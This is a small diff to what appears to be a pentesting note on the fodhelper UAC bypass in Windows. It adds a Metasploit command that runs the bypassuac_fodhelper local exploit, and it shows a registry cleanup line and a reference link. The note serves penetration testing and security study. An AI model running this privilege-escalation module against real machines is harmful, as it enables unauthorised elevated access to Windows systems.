@@ -23,6 +23,10 @@ Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 }
 ```
 
+## msf
+
+* `run exploit/windows/local/bypassuac_fodhelper`
+
 ## Reference
 
 * [pentestlab.blog/uac-bypass-fodhelper/](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)
